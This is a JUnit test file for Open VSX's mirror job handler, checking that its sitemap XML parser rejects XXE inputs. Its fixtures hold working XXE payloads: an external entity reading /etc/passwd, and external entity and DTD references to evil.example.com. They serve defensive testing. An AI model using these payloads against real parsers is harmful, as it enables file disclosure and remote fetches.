/********************************************************************************
 * Copyright (c) 2026 Eclipse Foundation AISBL.
 *
 * See the NOTICE file(s) distributed with this work for additional
 * information regarding copyright ownership.
 *
 * This program and the accompanying materials are made available under the
 * terms of the Eclipse Public License 2.0 which is available at
 * https://www.eclipse.org/legal/epl-2.0
 *
 * SPDX-License-Identifier: EPL-2.0
 * 
 * This file was developed with the assistance of AI (Claude by Anthropic).
 ********************************************************************************/
package org.eclipse.openvsx.mirror;

import org.eclipse.openvsx.UrlConfigService;
import org.eclipse.openvsx.admin.AdminService;
import org.eclipse.openvsx.repositories.RepositoryService;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;
import org.xml.sax.SAXException;

import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

@ExtendWith(MockitoExtension.class)
class DataMirrorJobRequestHandlerTest {

    @Mock DataMirrorService dataMirrorService;
    @Mock RepositoryService repositories;
    @Mock RestTemplate backgroundRestTemplate;
    @Mock UrlConfigService urlConfigService;
    @Mock AdminService admin;
    @Mock MirrorExtensionService mirrorExtensionService;

    private DataMirrorJobRequestHandler handler;

    @BeforeEach
    void setUp() {
        handler = new DataMirrorJobRequestHandler(
                Optional.of(dataMirrorService),
                repositories,
                backgroundRestTemplate,
                urlConfigService,
                admin,
                mirrorExtensionService
        );
        when(urlConfigService.getMirrorServerUrl()).thenReturn("https://open-vsx.org");
    }

    @Test
    void shouldParseValidSitemapXmlWithoutXmlSecurityException() {
        mockSitemapResponse("""
                <?xml version="1.0" encoding="UTF-8"?>
                <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
                    <url>
                        <loc>https://open-vsx.org/extension/publisher/name</loc>
                        <lastmod>2024-01-01</lastmod>
                    </url>
                </urlset>
                """);

        // Valid XML passes all security checks; any subsequent failure comes from the job
        // infrastructure (jobContext()), not from XML parsing
        assertThatThrownBy(() -> handler.run(new DataMirrorJobRequest()))
                .isNotInstanceOf(SAXException.class);
    }

    @Test
    void shouldRejectXmlWithInlineDoctypeEntityDeclaration() {
        // Tests the disallow-doctype-decl feature: any DOCTYPE declaration
        // must be rejected to prevent local entity injection
        mockSitemapResponse("""
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE urlset [<!ENTITY secret "sensitive-data">]>
                <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
                </urlset>
                """);

        assertThatThrownBy(() -> handler.run(new DataMirrorJobRequest()))
                .isInstanceOf(SAXException.class);
    }

    @Test
    void shouldRejectXmlWithExternalGeneralEntityReference() {
        // Tests the external-general-entities feature: external system entity
        // references (classic XXE attack vector) must be rejected
        mockSitemapResponse("""
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE urlset [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
                    <url><loc>&xxe;</loc></url>
                </urlset>
                """);

        assertThatThrownBy(() -> handler.run(new DataMirrorJobRequest()))
                .isInstanceOf(SAXException.class);
    }

    @Test
    void shouldRejectXmlWithExternalParameterEntityReference() {
        // Tests the external-parameter-entities feature: parameter entity
        // references that pull in external content must be rejected
        mockSitemapResponse("""
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE urlset [<!ENTITY % remote SYSTEM "http://evil.example.com/evil.xml"> %remote;]>
                <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
                </urlset>
                """);

        assertThatThrownBy(() -> handler.run(new DataMirrorJobRequest()))
                .isInstanceOf(SAXException.class);
    }

    @Test
    void shouldRejectXmlWithExternalDtdReference() {
        // Tests the ACCESS_EXTERNAL_DTD attribute: external DTD system
        // identifiers must not be fetched
        mockSitemapResponse("""
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE urlset SYSTEM "http://evil.example.com/evil.dtd">
                <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
                </urlset>
                """);

        assertThatThrownBy(() -> handler.run(new DataMirrorJobRequest()))
                .isInstanceOf(SAXException.class);
    }

    @SuppressWarnings("unchecked")
    private void mockSitemapResponse(String xmlBody) {
        var response = (ResponseEntity<String>) mock(ResponseEntity.class);
        when(response.getStatusCode()).thenReturn(HttpStatus.OK);
        when(response.getBody()).thenReturn(xmlBody);
        when(backgroundRestTemplate.exchange(any(), eq(String.class))).thenReturn(response);
    }
}
